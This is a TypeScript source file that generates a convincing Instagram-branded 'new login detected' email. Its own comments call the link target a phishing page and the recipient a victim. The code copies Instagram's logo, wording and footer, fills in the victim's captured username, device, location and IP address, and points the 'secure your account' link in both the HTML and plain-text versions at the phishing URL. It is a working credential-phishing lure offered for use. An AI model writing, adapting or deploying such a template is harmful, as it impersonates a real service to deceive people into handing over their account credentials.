export interface LoginAlertData {
  username: string;   // captured email / username
  os: string;         // e.g. "Linux"
  browser: string;    // e.g. "Firefox 135"
  city: string;
  country: string;
  publicIp: string;
  /** The phishing page URL — victim is directed here via "secure your account" link */
  phishingUrl: string;
}

/**
 * Generates an Instagram-style "new login detected" notification email.
 */
export function generateLoginAlertEmail(data: LoginAlertData): {
  subject: string;
  html: string;
  text: string;
} {
  const { username, os, browser, city, country, publicIp, phishingUrl } = data;
  const subject = `New login to Instagram from ${browser} on ${os}`;

  const now = new Date();
  const dateStr = now.toLocaleDateString("en-US", {
    month: "long",
    day: "numeric",
  });
  const timeStr = now.toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    timeZoneName: "short",
  });
  const locationLine = [city, country].filter(Boolean).join(", ") || "Unknown location";
  const deviceLine = [os, browser, locationLine].filter(Boolean).join(" · ");

  // Inline SVG monitor icon (matches Instagram alert style)
  const monitorSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"
         viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="1.2"
         stroke-linecap="round" stroke-linejoin="round">
      <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
      <line x1="8" y1="21" x2="16" y2="21"/>
      <line x1="12" y1="17" x2="12" y2="21"/>
    </svg>`;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>${subject}</title>
</head>
<body style="margin:0;padding:0;background-color:#ffffff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
    style="background:#ffffff;">
    <tr>
      <td align="center" style="padding:40px 20px;">
        <table role="presentation" width="460" cellspacing="0" cellpadding="0" border="0"
          style="max-width:460px;width:100%;">

          <!-- Logo row -->
          <tr>
            <td align="center" style="padding-bottom:32px;">
              <table role="presentation" cellspacing="0" cellpadding="0" border="0">
                <tr>
                  <td style="padding-right:10px;vertical-align:middle;">
                    <!-- Instagram camera SVG -->
                    <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24"
                         fill="none" stroke="#262626" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                      <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
                      <circle cx="12" cy="12" r="4"/>
                      <circle cx="17.5" cy="6.5" r="0.5" fill="#262626"/>
                    </svg>
                  </td>
                  <td style="vertical-align:middle;">
                    <span style="font-family:Georgia,'Times New Roman',serif;font-size:28px;
                                 font-weight:400;color:#262626;letter-spacing:-0.5px;">
                      Instagram
                    </span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- Divider -->
          <tr><td style="border-top:1px solid #dbdbdb;"></td></tr>

          <!-- Heading -->
          <tr>
            <td align="center" style="padding:32px 0 8px;">
              <p style="margin:0;font-size:18px;color:#262626;">
                We noticed a new login, ${username}
              </p>
            </td>
          </tr>
          <tr>
            <td align="center" style="padding-bottom:28px;">
              <p style="margin:0;font-size:14px;color:#8e8e8e;line-height:1.5;">
                We noticed a login from a device you don't usually use.
              </p>
            </td>
          </tr>

          <!-- Device icon -->
          <tr>
            <td align="center" style="padding-bottom:16px;">
              <div style="display:inline-block;border:1.5px solid #262626;border-radius:50%;
                          padding:18px;line-height:0;">
                ${monitorSvg}
              </div>
            </td>
          </tr>

          <!-- Device / location info -->
          <tr>
            <td align="center" style="padding-bottom:6px;">
              <p style="margin:0;font-size:15px;font-weight:600;color:#262626;">
                ${deviceLine}
              </p>
            </td>
          </tr>
          <tr>
            <td align="center" style="padding-bottom:6px;">
              <p style="margin:0;font-size:13px;color:#8e8e8e;">
                IP: ${publicIp}
              </p>
            </td>
          </tr>
          <tr>
            <td align="center" style="padding-bottom:32px;">
              <p style="margin:0;font-size:13px;color:#8e8e8e;">
                ${dateStr} at ${timeStr}
              </p>
            </td>
          </tr>

          <!-- Divider -->
          <tr><td style="border-top:1px solid #dbdbdb;"></td></tr>

          <!-- Body copy -->
          <tr>
            <td align="center" style="padding:28px 20px 16px;">
              <p style="margin:0;font-size:13px;color:#8e8e8e;line-height:1.6;text-align:center;">
                If this was you, you won't be able to access certain security and account settings
                for a few days. You can still access these settings from a device you've logged
                in with in the past.
              </p>
            </td>
          </tr>
          <tr>
            <td align="center" style="padding:0 20px 32px;">
              <p style="margin:0;font-size:13px;color:#8e8e8e;line-height:1.6;text-align:center;">
                If this wasn't you, you can
                <a href="${phishingUrl}"
                   style="color:#00376b;text-decoration:none;font-weight:500;">
                  secure your account
                </a>
                from a device you've logged in with in the past.
              </p>
            </td>
          </tr>

          <!-- Divider -->
          <tr><td style="border-top:1px solid #dbdbdb;"></td></tr>

          <!-- Footer -->
          <tr>
            <td align="center" style="padding-top:20px;">
              <p style="margin:0;font-size:12px;color:#c7c7c7;">
                This message was sent to ${username} &bull;
                <a href="https://www.instagram.com" style="color:#c7c7c7;text-decoration:none;">
                  Instagram from Meta
                </a>
              </p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;

  const text =
    `New login to Instagram\n\n` +
    `We noticed a new login, ${username}\n` +
    `We noticed a login from a device you don't usually use.\n\n` +
    `Device   : ${deviceLine}\n` +
    `IP       : ${publicIp}\n` +
    `Time     : ${dateStr} at ${timeStr}\n\n` +
    `If this wasn't you, secure your account: ${phishingUrl}`;

  return { subject, html, text };
}
